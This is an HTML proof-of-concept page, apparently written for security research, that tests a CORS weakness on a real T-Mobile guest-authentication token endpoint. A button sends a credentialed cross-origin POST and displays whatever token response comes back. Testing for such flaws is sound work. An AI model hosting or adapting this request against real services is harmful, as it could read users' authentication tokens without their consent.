<!DOCTYPE html>
<html>
<head>
    <title>T-Mobile PoC</title>
</head>
<body style="font-family:sans-serif; padding:40px;">

    <h1>T-Mobile CORS Test</h1>
    <p>Check the browser console (F12) to see progress.</p>
    
    <button id="runBtn" style="padding:15px 30px; background:#e20074; color:white; border:none; cursor:pointer;">
        FIRE REQUEST
    </button>
    
    <div style="margin-top:20px;">
        <strong>Log:</strong>
        <pre id="output" style="background:#eee; padding:15px; border:1px solid #ccc;">Waiting for click...</pre>
    </div>

    <script>
        // Log immediately to prove the script is alive
        console.log("Script loaded and running.");

        document.getElementById('runBtn').onclick = function() {
            console.log("Button was clicked!");
            var output = document.getElementById('output');
            output.innerText = "Button clicked! Firing request...";

            var target = 'https://adn.t-mobile.com/guest-auth/prd01/guest/v1/tokens?v=' + Date.now();
            
            console.log("Fetching from:", target);

            fetch(target, {
                method: 'POST',
                mode: 'cors',
                credentials: 'include',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: '{"grant_type":"guest"}'
            })
            .then(function(response) {
                console.log("Response received with status:", response.status);
                output.innerText = "Status: " + response.status;
                return response.text();
            })
            .then(function(data) {
                console.log("Data received:", data);
                output.innerText += "\n\nBody: " + data;
            })
            .catch(function(err) {
                console.error("Fetch error:", err);
                output.innerText = "Error: " + err;
            });
        };
    </script>
</body>
</html>
